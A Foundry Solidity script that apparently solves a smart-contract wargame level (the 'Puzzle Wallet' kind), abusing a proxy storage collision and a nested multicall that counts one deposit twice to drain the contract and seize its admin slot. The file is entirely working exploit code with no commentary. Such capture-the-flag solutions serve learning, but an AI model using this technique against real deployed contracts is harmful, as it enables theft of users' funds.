// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "forge-std/Script.sol";

contract ExploitLevel24 is Script {
    ILevel14 instance = ILevel14(0x3F9b87959f598D0A2a398330704fa54a3A9c1A30);
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;

    function run() external {
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(instance.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(instance.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(instance.multicall.selector, depositSelector);
        uint256 instBalance = address(instance).balance;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.proposeNewAdmin(player);
        instance.addToWhitelist(player);
        instance.multicall{value: instBalance}(nestedMulticall);
        instance.execute(player, instBalance * 2, "");
        instance.setMaxBalance(uint256(uint160((player))));
        vm.stopBroadcast();

        console.log("Admin:", instance.admin());
    }
}

interface ILevel14 {
    function proposeNewAdmin(address) external;
    function addToWhitelist(address) external;
    function multicall(bytes[] calldata) external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function setMaxBalance(uint256) external;
    function deposit() external payable;
    function owner() external returns (address);
    function admin() external returns (address);
}
